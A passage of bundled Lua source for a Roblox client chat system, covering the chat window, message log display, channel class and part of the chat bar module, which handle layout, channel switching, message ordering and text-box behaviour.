					if not bubbleChatOnly() then
						ChatBarParentFrame.Position = UDim2.new(0, 0, 1, -frameSizeY)
					end
				end
			end
		
			local function UpdateChatChannelParentFrameSize()
				local channelsBarSize = CalculateChannelsBarPixelSize()
				local chatBarSize = CalculateChatBarPixelSize()
		
				if (ChatSettings.ShowChannelsBar) then
					ChatChannelParentFrame.Size = UDim2.new(1, 0, 1, -(channelsBarSize + chatBarSize + 2 + 2))
					ChatChannelParentFrame.Position = UDim2.new(0, 0, 0, channelsBarSize + 2)
		
				else
					ChatChannelParentFrame.Size = UDim2.new(1, 0, 1, -(chatBarSize + 2 + 2))
					ChatChannelParentFrame.Position = UDim2.new(0, 0, 0, 2)
		
				end
			end
		
			local function UpdateChatChannelsTabTextSize(size)
				local channelsBarSize = CalculateChannelsBarPixelSize(size)
				ChannelsBarParentFrame.Size = UDim2.new(1, 0, 0, channelsBarSize)
		
				UpdateChatChannelParentFrameSize()
			end
		
			local function UpdateChatBarTextSize(size)
				local chatBarSize = CalculateChatBarPixelSize(size)
		
				ChatBarParentFrame.Size = UDim2.new(1, 0, 0, chatBarSize)
				if not bubbleChatOnly() then
					ChatBarParentFrame.Position = UDim2.new(0, 0, 1, -chatBarSize)
				end
		
				ChatResizerFrame.Size = UDim2.new(0, chatBarSize, 0, chatBarSize)
				ChatResizerFrame.Position = UDim2.new(1, -chatBarSize, 1, -chatBarSize)
		
				UpdateChatChannelParentFrameSize()
				UpdateResizable(ChatSettings.WindowResizable)
			end
		
			local function UpdateShowChannelsBar(enabled)
				ChannelsBarParentFrame.Visible = enabled
				UpdateChatChannelParentFrameSize()
			end
		
			UpdateChatChannelsTabTextSize(ChatSettings.ChatChannelsTabTextSize)
			UpdateChatBarTextSize(ChatSettings.ChatBarTextSize)
			UpdateDraggable(ChatSettings.WindowDraggable)
			UpdateResizable(ChatSettings.WindowResizable)
			UpdateShowChannelsBar(ChatSettings.ShowChannelsBar)
		
			ChatSettings.SettingsChanged:connect(function(setting, value)
				if (setting == "WindowDraggable") then
					UpdateDraggable(value)
		
				elseif (setting == "WindowResizable") then
					UpdateResizable(value)
		
				elseif (setting == "ChatChannelsTabTextSize") then
					UpdateChatChannelsTabTextSize(value)
		
				elseif (setting == "ChatBarTextSize") then
					UpdateChatBarTextSize(value)
		
				elseif (setting == "ShowChannelsBar") then
					UpdateShowChannelsBar(value)
		
				end
			end)
		
			self.GuiObject = BaseFrame
		
			self.GuiObjects.BaseFrame = BaseFrame
			self.GuiObjects.ChatBarParentFrame = ChatBarParentFrame
			self.GuiObjects.ChannelsBarParentFrame = ChannelsBarParentFrame
			self.GuiObjects.ChatChannelParentFrame = ChatChannelParentFrame
			self.GuiObjects.ChatResizerFrame = ChatResizerFrame
			self.GuiObjects.ResizeIcon = ResizeIcon
			self:AnimGuiObjects()
		end
		
		function methods:GetChatBar()
			return self.ChatBar
		end
		
		function methods:RegisterChatBar(ChatBar)
			self.ChatBar = ChatBar
			self.ChatBar:CreateGuiObjects(self.GuiObjects.ChatBarParentFrame)
		end
		
		function methods:RegisterChannelsBar(ChannelsBar)
			self.ChannelsBar = ChannelsBar
			self.ChannelsBar:CreateGuiObjects(self.GuiObjects.ChannelsBarParentFrame)
		end
		
		function methods:RegisterMessageLogDisplay(MessageLogDisplay)
			self.MessageLogDisplay = MessageLogDisplay
			self.MessageLogDisplay.GuiObject.Parent = self.GuiObjects.ChatChannelParentFrame
		end
		
		function methods:AddChannel(channelName)
			if (self:GetChannel(channelName)) then
				error("Channel '" .. channelName .. "' already exists!")
				return
			end
		
			local channel = moduleChatChannel.new(channelName, self.MessageLogDisplay)
			self.Channels[channelName:lower()] = channel
		
			channel:SetActive(false)
		
			local tab = self.ChannelsBar:AddChannelTab(channelName)
			tab.NameTag.MouseButton1Click:connect(function()
				self:SwitchCurrentChannel(channelName)
			end)
		
			channel:RegisterChannelTab(tab)
		
			return channel
		end
		
		function methods:GetFirstChannel()
			--// Channels are not indexed numerically, so this function is necessary.
			--// Grabs and returns the first channel it happens to, or nil if none exist.
			for i, v in pairs(self.Channels) do
				return v
			end
			return nil
		end
		
		function methods:RemoveChannel(channelName)
			if (not self:GetChannel(channelName)) then
				error("Channel '" .. channelName .. "' does not exist!")
			end
		
			local indexName = channelName:lower()
		
			local needsChannelSwitch = false
			if (self.Channels[indexName] == self:GetCurrentChannel()) then
				needsChannelSwitch = true
		
				self:SwitchCurrentChannel(nil)
			end
		
			self.Channels[indexName]:Destroy()
			self.Channels[indexName] = nil
		
			self.ChannelsBar:RemoveChannelTab(channelName)
		
			if (needsChannelSwitch) then
				local generalChannelExists = (self:GetChannel(ChatSettings.GeneralChannelName) ~= nil)
				local removingGeneralChannel = (indexName == ChatSettings.GeneralChannelName:lower())
		
				local targetSwitchChannel = nil
		
				if (generalChannelExists and not removingGeneralChannel) then
					targetSwitchChannel = ChatSettings.GeneralChannelName
				else
					local firstChannel = self:GetFirstChannel()
					targetSwitchChannel = (firstChannel and firstChannel.Name or nil)
				end
		
				self:SwitchCurrentChannel(targetSwitchChannel)
			end
		
			if not ChatSettings.ShowChannelsBar then
				if self.ChatBar.TargetChannel == channelName then
					self.ChatBar:SetChannelTarget(ChatSettings.GeneralChannelName)
				end
			end
		end
		
		function methods:GetChannel(channelName)
			return channelName and self.Channels[channelName:lower()] or nil
		end
		
		function methods:GetTargetMessageChannel()
			if (not ChatSettings.ShowChannelsBar) then
				return self.ChatBar.TargetChannel
			else
				local curChannel = self:GetCurrentChannel()
				return curChannel and curChannel.Name
			end
		end
		
		function methods:GetCurrentChannel()
			return self.CurrentChannel
		end
		
		function methods:SwitchCurrentChannel(channelName)
			if (not ChatSettings.ShowChannelsBar) then
				local targ = self:GetChannel(channelName)
				if (targ) then
					self.ChatBar:SetChannelTarget(targ.Name)
				end
		
				channelName = ChatSettings.GeneralChannelName
			end
		
			local cur = self:GetCurrentChannel()
			local new = self:GetChannel(channelName)
			if new == nil then
				error(string.format("Channel '%s' does not exist.", channelName))
			end
		
			if (new ~= cur) then
				if (cur) then
					cur:SetActive(false)
					local tab = self.ChannelsBar:GetChannelTab(cur.Name)
					tab:SetActive(false)
				end
		
				if (new) then
					new:SetActive(true)
					local tab = self.ChannelsBar:GetChannelTab(new.Name)
					tab:SetActive(true)
				end
		
				self.CurrentChannel = new
			end
		
		end
		
		function methods:UpdateFrameVisibility()
			self.GuiObject.Visible = (self.Visible and self.CoreGuiEnabled)
		end
		
		function methods:GetVisible()
			return self.Visible
		end
		
		function methods:SetVisible(visible)
			self.Visible = visible
			self:UpdateFrameVisibility()
		end
		
		function methods:GetCoreGuiEnabled()
			return self.CoreGuiEnabled
		end
		
		function methods:SetCoreGuiEnabled(enabled)
			self.CoreGuiEnabled = enabled
			self:UpdateFrameVisibility()
		end
		
		function methods:EnableResizable()
			self.GuiObjects.ChatResizerFrame.Active = true
		end
		
		function methods:DisableResizable()
			self.GuiObjects.ChatResizerFrame.Active = false
		end
		
		function methods:FadeOutBackground(duration)
			self.ChannelsBar:FadeOutBackground(duration)
			self.MessageLogDisplay:FadeOutBackground(duration)
			self.ChatBar:FadeOutBackground(duration)
		
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInBackground(duration)
			self.ChannelsBar:FadeInBackground(duration)
			self.MessageLogDisplay:FadeInBackground(duration)
			self.ChatBar:FadeInBackground(duration)
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeOutText(duration)
			self.MessageLogDisplay:FadeOutText(duration)
			self.ChannelsBar:FadeOutText(duration)
		end
		
		function methods:FadeInText(duration)
			self.MessageLogDisplay:FadeInText(duration)
			self.ChannelsBar:FadeInText(duration)
		end
		
		function methods:AnimGuiObjects()
			self.GuiObjects.ChatChannelParentFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.ChatResizerFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.ResizeIcon.ImageTransparency = self.AnimParams.Background_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		end
		
		function methods:Update(dtScale)
			self.ChatBar:Update(dtScale)
			self.ChannelsBar:Update(dtScale)
			self.MessageLogDisplay:Update(dtScale)
		
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.GuiObject = nil
			obj.GuiObjects = {}
		
			obj.ChatBar = nil
			obj.ChannelsBar = nil
			obj.MessageLogDisplay = nil
		
			obj.Channels = {}
			obj.CurrentChannel = nil
		
			obj.Visible = true
			obj.CoreGuiEnabled = true
		
			obj.AnimParams = {}
		
			obj:InitializeAnimParams()
		
			return obj
		end
		
		return module
		
	end[message_log_display] = function()
		--	// FileName: MessageLogDisplay.lua
		--	// Written by: Xsitsu, TheGamer101
		--	// Description: ChatChannel window for displaying messages.
		
		local module = {}
		module.ScrollBarThickness = 4
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local moduleMessageLabelCreator = require(modulesFolder:WaitForChild("MessageLabelCreator"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		
		local MessageLabelCreator = moduleMessageLabelCreator.new()
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		local function CreateGuiObjects()
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 1
		
			local Scroller = Instance.new("ScrollingFrame")
			Scroller.Selectable = ChatSettings.GamepadNavigationEnabled
			Scroller.Name = "Scroller"
			Scroller.BackgroundTransparency = 1
			Scroller.BorderSizePixel = 0
			Scroller.Position = UDim2.new(0, 0, 0, 3)
			Scroller.Size = UDim2.new(1, -4, 1, -6)
			Scroller.CanvasSize = UDim2.new(0, 0, 0, 0)
			Scroller.ScrollBarThickness = module.ScrollBarThickness
			Scroller.Active = true
			Scroller.Parent = BaseFrame
		
			local Layout = Instance.new("UIListLayout")
			Layout.SortOrder = Enum.SortOrder.LayoutOrder
			Layout.Parent = Scroller
		
			return BaseFrame, Scroller, Layout
		end
		
		function methods:Destroy()
			self.GuiObject:Destroy()
			self.Destroyed = true
		end
		
		function methods:SetActive(active)
			self.GuiObject.Visible = active
		end
		
		function methods:UpdateMessageFiltered(messageData)
			local messageObject = nil
			local searchIndex = 1
			local searchTable = self.MessageObjectLog
		
			while (#searchTable >= searchIndex) do
				local obj = searchTable[searchIndex]
		
				if obj.ID == messageData.ID then
					messageObject = obj
					break
				end
		
				searchIndex = searchIndex + 1
			end
		
			if messageObject then
				messageObject.UpdateTextFunction(messageData)
				self:PositionMessageLabelInWindow(messageObject, searchIndex)
			end
		end
		
		function methods:AddMessage(messageData)
			self:WaitUntilParentedCorrectly()
		
			local messageObject = MessageLabelCreator:CreateMessageLabel(messageData, self.CurrentChannelName)
			if messageObject == nil then
				return
			end
		
			table.insert(self.MessageObjectLog, messageObject)
			self:PositionMessageLabelInWindow(messageObject, #self.MessageObjectLog)
		end
		
		function methods:AddMessageAtIndex(messageData, index)
			local messageObject = MessageLabelCreator:CreateMessageLabel(messageData, self.CurrentChannelName)
			if messageObject == nil then
				return
			end
		
			table.insert(self.MessageObjectLog, index, messageObject)
		
			self:PositionMessageLabelInWindow(messageObject, index)
		end
		
		function methods:RemoveLastMessage()
			self:WaitUntilParentedCorrectly()
		
			local lastMessage = self.MessageObjectLog[1]
		
			lastMessage:Destroy()
			table.remove(self.MessageObjectLog, 1)
		end
		
		function methods:IsScrolledDown()
			local yCanvasSize = self.Scroller.CanvasSize.Y.Offset
			local yContainerSize = self.Scroller.AbsoluteWindowSize.Y
			local yScrolledPosition = self.Scroller.CanvasPosition.Y
		
			return (yCanvasSize < yContainerSize or
				yCanvasSize - yScrolledPosition <= yContainerSize + 5)
		end
		
		function methods:UpdateMessageTextHeight(messageObject)
			local baseFrame = messageObject.BaseFrame
			for i = 1, 10 do
				if messageObject.BaseMessage.TextFits then
					break
				end
		
				local trySize = self.Scroller.AbsoluteSize.X - i
				baseFrame.Size = UDim2.new(1, 0, 0, messageObject.GetHeightFunction(trySize))
			end
		end
		
		function methods:PositionMessageLabelInWindow(messageObject, index)
			self:WaitUntilParentedCorrectly()
		
			local wasScrolledDown = self:IsScrolledDown()
		
			local baseFrame = messageObject.BaseFrame
		
			local layoutOrder = 1
			if self.MessageObjectLog[index - 1] then
				if index == #self.MessageObjectLog then
					layoutOrder = self.MessageObjectLog[index - 1].BaseFrame.LayoutOrder + 1
				else
					layoutOrder = self.MessageObjectLog[index - 1].BaseFrame.LayoutOrder
				end
			end
			baseFrame.LayoutOrder = layoutOrder
		
			baseFrame.Size = UDim2.new(1, 0, 0, messageObject.GetHeightFunction(self.Scroller.AbsoluteSize.X))
			baseFrame.Parent = self.Scroller
		
			if messageObject.BaseMessage then
				self:UpdateMessageTextHeight(messageObject)
			end
		
			if wasScrolledDown then
				self.Scroller.CanvasPosition = Vector2.new(
					0, math.max(0, self.Scroller.CanvasSize.Y.Offset - self.Scroller.AbsoluteSize.Y))
			end
		end
		
		function methods:ReorderAllMessages()
			self:WaitUntilParentedCorrectly()
		
			--// Reordering / reparenting with a size less than 1 causes weird glitches to happen
			-- with scrolling as repositioning happens.
			if self.GuiObject.AbsoluteSize.Y < 1 then return end
		
			local oldCanvasPositon = self.Scroller.CanvasPosition
			local wasScrolledDown = self:IsScrolledDown()
		
			for _, messageObject in pairs(self.MessageObjectLog) do
				self:UpdateMessageTextHeight(messageObject)
			end
		
			if not wasScrolledDown then
				self.Scroller.CanvasPosition = oldCanvasPositon
			else
				self.Scroller.CanvasPosition = Vector2.new(
					0, math.max(0, self.Scroller.CanvasSize.Y.Offset - self.Scroller.AbsoluteSize.Y))
			end
		end
		
		function methods:Clear()
			for _, v in pairs(self.MessageObjectLog) do
				v:Destroy()
			end
			self.MessageObjectLog = {}
		end
		
		function methods:SetCurrentChannelName(name)
			self.CurrentChannelName = name
		end
		
		function methods:FadeOutBackground(duration)
			--// Do nothing
		end
		
		function methods:FadeInBackground(duration)
			--// Do nothing
		end
		
		function methods:FadeOutText(duration)
			for i = 1, #self.MessageObjectLog do
				if self.MessageObjectLog[i].FadeOutFunction then
					self.MessageObjectLog[i].FadeOutFunction(duration, CurveUtil)
				end
			end
		end
		
		function methods:FadeInText(duration)
			for i = 1, #self.MessageObjectLog do
				if self.MessageObjectLog[i].FadeInFunction then
					self.MessageObjectLog[i].FadeInFunction(duration, CurveUtil)
				end
			end
		end
		
		function methods:Update(dtScale)
			for i = 1, #self.MessageObjectLog do
				if self.MessageObjectLog[i].UpdateAnimFunction then
					self.MessageObjectLog[i].UpdateAnimFunction(dtScale, CurveUtil)
				end
			end
		end
		
		--// ToDo: Move to common modules
		function methods:WaitUntilParentedCorrectly()
			while (not self.GuiObject:IsDescendantOf(game:GetService("Players").LocalPlayer)) do
				self.GuiObject.AncestryChanged:wait()
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
			obj.Destroyed = false
		
			local BaseFrame, Scroller, Layout = CreateGuiObjects()
			obj.GuiObject = BaseFrame
			obj.Scroller = Scroller
			obj.Layout = Layout
		
			obj.MessageObjectLog = {}
		
			obj.Name = "MessageLogDisplay"
			obj.GuiObject.Name = "Frame_" .. obj.Name
		
			obj.CurrentChannelName = ""
		
			obj.GuiObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
				spawn(function() obj:ReorderAllMessages() end)
			end)
		
			local wasScrolledDown = true
		
			obj.Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
				local size = obj.Layout.AbsoluteContentSize
				obj.Scroller.CanvasSize = UDim2.new(0, 0, 0, size.Y)
				if wasScrolledDown then
					local windowSize = obj.Scroller.AbsoluteWindowSize
					obj.Scroller.CanvasPosition = Vector2.new(0, size.Y - windowSize.Y)
				end
			end)
		
			obj.Scroller:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
				wasScrolledDown = obj:IsScrolledDown()
			end)
		
			return obj
		end
		
		return module
		
	end[chatchannel] = function()
		--	// FileName: ChatChannel.lua
		--	// Written by: Xsitsu
		--	// Description: ChatChannel class for handling messages being added and removed from the chat channel.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:Destroy()
			self.Destroyed = true
		end
		
		function methods:SetActive(active)
			if active == self.Active then
				return
			end
			if active == false then
				self.MessageLogDisplay:Clear()
			else
				self.MessageLogDisplay:SetCurrentChannelName(self.Name)
				for i = 1, #self.MessageLog do
					self.MessageLogDisplay:AddMessage(self.MessageLog[i])
				end
			end
			self.Active = active
		end
		
		function methods:UpdateMessageFiltered(messageData)
			local searchIndex = 1
			local searchTable = self.MessageLog
			local messageObj = nil
			while (#searchTable >= searchIndex) do
				local obj = searchTable[searchIndex]
		
				if (obj.ID == messageData.ID) then
					messageObj = obj
					break
				end
		
				searchIndex = searchIndex + 1
			end
		
			if messageObj then
				messageObj.Message = messageData.Message
				messageObj.IsFiltered = true
				if self.Active then
					self.MessageLogDisplay:UpdateMessageFiltered(messageObj)
				end
			else
				-- We have not seen this filtered message before, but we should still add it to our log.
				self:AddMessageToChannelByTimeStamp(messageData)
			end
		end
		
		function methods:AddMessageToChannel(messageData)
			table.insert(self.MessageLog, messageData)
			if self.Active then
				self.MessageLogDisplay:AddMessage(messageData)
			end
			if #self.MessageLog > ChatSettings.MessageHistoryLengthPerChannel then
				self:RemoveLastMessageFromChannel()
			end
		end
		
		function methods:InternalAddMessageAtTimeStamp(messageData)
			for i = 1, #self.MessageLog do
				if messageData.Time < self.MessageLog[i].Time then
					table.insert(self.MessageLog, i, messageData)
					return
				end
			end
			table.insert(self.MessageLog, messageData)
		end
		
		function methods:AddMessagesToChannelByTimeStamp(messageLog, startIndex)
			for i = startIndex, #messageLog do
				self:InternalAddMessageAtTimeStamp(messageLog[i])
			end
			while #self.MessageLog > ChatSettings.MessageHistoryLengthPerChannel do
				table.remove(self.MessageLog, 1)
			end
			if self.Active then
				self.MessageLogDisplay:Clear()
				for i = 1, #self.MessageLog do
					self.MessageLogDisplay:AddMessage(self.MessageLog[i])
				end
			end
		end
		
		function methods:AddMessageToChannelByTimeStamp(messageData)
			if #self.MessageLog >= 1 then
				-- These are the fast cases to evalutate.
				if self.MessageLog[1].Time > messageData.Time then
					return
				elseif messageData.Time >= self.MessageLog[#self.MessageLog].Time then
					self:AddMessageToChannel(messageData)
					return
				end
		
				for i = 1, #self.MessageLog do
					if messageData.Time < self.MessageLog[i].Time then
						table.insert(self.MessageLog, i, messageData)
		
						if #self.MessageLog > ChatSettings.MessageHistoryLengthPerChannel then
							self:RemoveLastMessageFromChannel()
						end
		
						if self.Active then
							self.MessageLogDisplay:AddMessageAtIndex(messageData, i)
						end
		
						return
					end
				end
			else
				self:AddMessageToChannel(messageData)
			end
		end
		
		function methods:RemoveLastMessageFromChannel()
			table.remove(self.MessageLog, 1)
		
			if self.Active then
				self.MessageLogDisplay:RemoveLastMessage()
			end
		end
		
		function methods:ClearMessageLog()
			self.MessageLog = {}
		
			if self.Active then
				self.MessageLogDisplay:Clear()
			end
		end
		
		function methods:RegisterChannelTab(tab)
			self.ChannelTab = tab
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(channelName, messageLogDisplay)
			local obj = setmetatable({}, methods)
			obj.Destroyed = false
			obj.Active = false
		
			obj.MessageLog = {}
			obj.MessageLogDisplay = messageLogDisplay
			obj.ChannelTab = nil
			obj.Name = channelName
		
			return obj
		end
		
		return module
		
	end[chat_bar] = function()
		--	// FileName: ChatBar.lua
		--	// Written by: Xsitsu
		--	// Description: Manages text typing and typing state.
		
		local module = {}
		
		local UserInputService = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		local Players = game:GetService("Players")
		local TextService = game:GetService("TextService")
		local LocalPlayer = Players.LocalPlayer
		
		while not LocalPlayer do
			Players.PlayerAdded:wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		local commandModules = clientChatModules:WaitForChild("CommandModules")
		local WhisperModule = require(commandModules:WaitForChild("Whisper"))
		
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} function ChatLocalization:Get(key,default) return default end end
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:CreateGuiObjects(targetParent)
			self.ChatBarParentFrame = targetParent
		
			local backgroundImagePixelOffset = 7
			local textBoxPixelOffset = 5
		
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 0.6
			BaseFrame.BorderSizePixel = 0
			BaseFrame.BackgroundColor3 = ChatSettings.ChatBarBackGroundColor
			BaseFrame.Parent = targetParent
		
			local BoxFrame = Instance.new("Frame")
			BoxFrame.Selectable = false
			BoxFrame.Name = "BoxFrame"
			BoxFrame.BackgroundTransparency = 0.6
			BoxFrame.BorderSizePixel = 0
			BoxFrame.BackgroundColor3 = ChatSettings.ChatBarBoxColor
			BoxFrame.Size = UDim2.new(1, -backgroundImagePixelOffset * 2, 1, -backgroundImagePixelOffset * 2)
			BoxFrame.Position = UDim2.new(0, backgroundImagePixelOffset, 0, backgroundImagePixelOffset)
			BoxFrame.Parent = BaseFrame
		
			local TextBoxHolderFrame = Instance.new("Frame")
			TextBoxHolderFrame.BackgroundTransparency = 1
			TextBoxHolderFrame.Size = UDim2.new(1, -textBoxPixelOffset * 2, 1, -textBoxPixelOffset * 2)
			TextBoxHolderFrame.Position = UDim2.new(0, textBoxPixelOffset, 0, textBoxPixelOffset)
			TextBoxHolderFrame.Parent = BoxFrame
		
			local TextBox = Instance.new("TextBox")
			TextBox.Selectable = ChatSettings.GamepadNavigationEnabled
			TextBox.Name = "ChatBar"
			TextBox.BackgroundTransparency = 1
			TextBox.Size = UDim2.new(1, 0, 1, 0)
			TextBox.Position = UDim2.new(0, 0, 0, 0)
			TextBox.TextSize = ChatSettings.ChatBarTextSize
			TextBox.Font = ChatSettings.ChatBarFont
			TextBox.TextColor3 = ChatSettings.ChatBarTextColor
			TextBox.TextTransparency = 0.4
			TextBox.TextStrokeTransparency = 1
			TextBox.ClearTextOnFocus = false
			TextBox.TextXAlignment = Enum.TextXAlignment.Left
			TextBox.TextYAlignment = Enum.TextYAlignment.Top
			TextBox.TextWrapped = true
			TextBox.Text = ""
			TextBox.Parent = TextBoxHolderFrame
		
			local MessageModeTextButton = Instance.new("TextButton")
			MessageModeTextButton.Selectable = false
			MessageModeTextButton.Name = "MessageMode"
			MessageModeTextButton.BackgroundTransparency = 1
			MessageModeTextButton.Position = UDim2.new(0, 0, 0, 0)
			MessageModeTextButton.TextSize = ChatSettings.ChatBarTextSize
			MessageModeTextButton.Font = ChatSettings.ChatBarFont
			MessageModeTextButton.TextXAlignment = Enum.TextXAlignment.Left
			MessageModeTextButton.TextWrapped = true
			MessageModeTextButton.Text = ""
			MessageModeTextButton.Size = UDim2.new(0, 0, 0, 0)
			MessageModeTextButton.TextYAlignment = Enum.TextYAlignment.Center
			MessageModeTextButton.TextColor3 = self:GetDefaultChannelNameColor()
			MessageModeTextButton.Visible = true
			MessageModeTextButton.Parent = TextBoxHolderFrame
		
			local TextLabel = Instance.new("TextLabel")
			TextLabel.Selectable = false
			TextLabel.TextWrapped = true
			TextLabel.BackgroundTransparency = 1
			TextLabel.Size = TextBox.Size
			TextLabel.Position = TextBox.Position
			TextLabel.TextSize = TextBox.TextSize
			TextLabel.Font = TextBox.Font
			TextLabel.TextColor3 = TextBox.TextColor3
			TextLabel.TextTransparency = TextBox.TextTransparency
			TextLabel.TextStrokeTransparency = TextBox.TextStrokeTransparency
			TextLabel.TextXAlignment = TextBox.TextXAlignment
			TextLabel.TextYAlignment = TextBox.TextYAlignment
			TextLabel.Text = "..."
			TextLabel.Parent = TextBoxHolderFrame
		
			self.GuiObject = BaseFrame
			self.TextBox = TextBox
			self.TextLabel  = TextLabel
		
			self.GuiObjects.BaseFrame = BaseFrame
			self.GuiObjects.TextBoxFrame = BoxFrame
			self.GuiObjects.TextBox = TextBox
			self.GuiObjects.TextLabel = TextLabel
			self.GuiObjects.MessageModeTextButton = MessageModeTextButton
		
			self:AnimGuiObjects()
			self:SetUpTextBoxEvents(TextBox, TextLabel, MessageModeTextButton)
			if self.UserHasChatOff then
				self:DoLockChatBar()
			end
			self.eGuiObjectsChanged:Fire()
		end
		
		-- Used to lock the chat bar when the user has chat turned off.
		function methods:DoLockChatBar()
			if self.TextLabel then
				if LocalPlayer.UserId > 0 then
					self.TextLabel.Text = ChatLocalization:Get(
						"GameChat_ChatMessageValidator_SettingsError",
						"To chat in game, turn on chat in your Privacy Settings."
					)
				else
					self.TextLabel.Text = ChatLocalization:Get(
						"GameChat_SwallowGuestChat_Message",
						"Sign up to chat in game."
					)
				end
				self:CalculateSize()
			end
			if self.TextBox then
				self.TextBox.Active = false
				self.TextBox.Focused:connect(function()
					self.TextBox:ReleaseFocus()
				end)
			end
		end
		
		function methods:SetUpTextBoxEvents(TextBox, TextLabel, MessageModeTextButton)
			-- Clean up events from a previous setup.
			for name, conn in pairs(self.TextBoxConnections) do
				conn:disconnect()
				self.TextBoxConnections[name] = nil
			end
		
			--// Code for getting back into general channel from other target channel when pressing backspace.
			self.TextBoxConnections.UserInputBegan = UserInputService.InputBegan:connect(function(inputObj, gpe)
				if (inputObj.KeyCode == Enum.KeyCode.Backspace) then
					if (self:IsFocused() and TextBox.Text == "") then
						self:SetChannelTarget(ChatSettings.GeneralChannelName)
					end
				end
			end)
		
			self.TextBoxConnections.TextBoxChanged = TextBox.Changed:connect(function(prop)
				if prop == "AbsoluteSize" then
					self:CalculateSize()
					return
				end
		
				if prop ~= "Text" then
					return
				end
		
				self:CalculateSize()
		
				if utf8.len(utf8.nfcnormalize(TextBox.Text)) > ChatSettings.MaximumMessageLength then
					TextBox.Text = self.PreviousText
				else
					self.PreviousText = TextBox.Text
				end
		
				if not self.InCustomState then
					local customState = self.CommandProcessor:ProcessInProgressChatMessage(TextBox.Text, self.ChatWindow, self)
					if customState then
						self.InCustomState = true
						self.CustomState = customState
					end
				else
					self.CustomState:TextUpdated()
				end
			end)
		
			local function UpdateOnFocusStatusChanged(isFocused)
				if isFocused or TextBox.Text ~= "" then
					TextLabel.Visible = false
				else
					TextLabel.Visible = true
				end
			end
		
			self.TextBoxConnections.MessageModeClick = MessageModeTextButton.MouseButton1Click:connect(function()
				if MessageModeTextButton.Text ~= "" then
					self:SetChannelTarget(ChatSettings.GeneralChannelName)
				end
			end)
		
			self.TextBoxConnections.TextBoxFocused = TextBox.Focused:connect(function()
				if not self.UserHasChatOff then
					self:CalculateSize()
					UpdateOnFocusStatusChanged(true)
				end
			end)
		
			self.TextBoxConnections.TextBoxFocusLost = TextBox.FocusLost:connect(function(enterPressed, inputObject)
				self:CalculateSize()
				if (inputObject and inputObject.KeyCode == Enum.KeyCode.Escape) then
					TextBox.Text = ""
				end
				UpdateOnFocusStatusChanged(false)
			end)
		end
		
		function methods:GetTextBox()
			return self.TextBox
		end
		
		function methods:GetMessageModeTextButton()
			return self.GuiObjects.MessageModeTextButton
		end
		
		-- Deprecated in favour of GetMessageModeTextButton
		-- Retained for compatibility reasons.
		function methods:GetMessageModeTextLabel()
			return self:GetMessageModeTextButton()
		end
		
		function methods:IsFocused()
			if self.UserHasChatOff then
				return false
			end
		
			return self:GetTextBox():IsFocused()
		end
		
		function methods:GetVisible()
			return self.GuiObject.Visible
		end
		
		function methods:CaptureFocus()
			if not self.UserHasChatOff then
				self:GetTextBox():CaptureFocus()
			end
		end
		
		function methods:ReleaseFocus(didRelease)
			self:GetTextBox():ReleaseFocus(didRelease)
		end
		
		function methods:ResetText()
			self:GetTextBox().Text = ""
		end
		
		function methods:SetText(text)
			self:GetTextBox().Text = text
		end
		
		function methods:GetEnabled()
			return self.GuiObject.Visible
		end
		
		function methods:SetEnabled(enabled)
			if self.UserHasChatOff then
				-- The chat bar can not be removed if a user has chat turned off so that
